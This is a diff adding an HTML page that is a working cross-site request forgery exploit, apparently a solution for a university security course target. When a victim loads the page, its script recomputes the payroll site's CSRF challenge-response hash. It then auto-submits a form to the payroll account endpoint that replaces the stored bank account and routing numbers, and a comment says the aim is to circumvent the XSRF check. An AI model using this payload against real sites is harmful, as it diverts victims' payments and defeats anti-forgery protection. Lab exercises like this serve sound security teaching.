@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html>
+<!-- the idea is to submit the corrent hidden respnse value to circumvent XSRF check from index.php-->
+<script>
+
+String.prototype.hashCode = function(){
+  var hash = 1;
+  for (i = 0; i < this.length; i++) {
+	hash = (13337 * hash + this.charCodeAt(i)) % 100000;
+  }
+  return hash;
+}
+
+function test() {
+
+var a = document.getElementById('account');
+var r = document.getElementById('route');
+var challenge = document.getElementById('csrfc').value;
+document.getElementById('csrfr').value = (a.value+challenge+r.value).hashCode();
+document.forms[0].submit();
+}
+</script>
+<!-- body onload='document.forms[0].submit();'-->
+<body onload='test();'>
+<form action='http://payroll.gatech.edu/account.php' method='POST'>
+
+<input id='account' type='hidden' name='account' value='3579248068' />
+<input id='route' type='hidden' name='routing' value='4275340171' />
+<input id='csrfc' type='hidden' name='challenge' value='' />
+<input id='csrfr' type="hidden" name="response" value='' />
+<input type='hidden' name='action' value='save'/>
+<input type="hidden" name="U3ByaW5nMjAxOVRhcmdldDFFYXN0ZXJFZ2c" value="U3ByaW5nMjAxOVRhcmdldDFFYXN0ZXJFZ2c">
+
+
+</form>
+</body>
+</html>
